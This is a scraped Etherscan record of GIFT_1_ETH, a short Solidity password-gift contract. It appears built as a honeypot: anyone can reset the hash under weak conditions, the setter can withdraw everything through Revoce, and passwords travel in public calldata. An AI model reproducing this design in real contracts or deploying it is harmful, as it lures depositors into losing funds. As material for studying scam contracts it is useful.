//token_name	
//token_url	https://etherscan.io//address/0x3597F78c7872DB259CE023aCc34511c7a79F42E3#code
//spider_time	2018/07/08 12:41:22
//token_Transactions	6 txns
//token_price	

pragma solidity ^0.4.19;

contract GIFT_1_ETH
{
    bool passHasBeenSet = false;
    
    address sender;
    
    bytes32 public hashPass;
	
	function() public payable{}
    
    function GetHash(bytes pass) public constant returns (bytes32) {return sha3(pass);}
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )
        {
            hashPass = hash;
            sender = msg.sender;
        }
    }
    
    function GetGift(bytes pass)
    external
    payable
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function Revoce()
    public
    payable
    {
        if(msg.sender==sender)
        {
            sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(msg.sender==sender&&hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}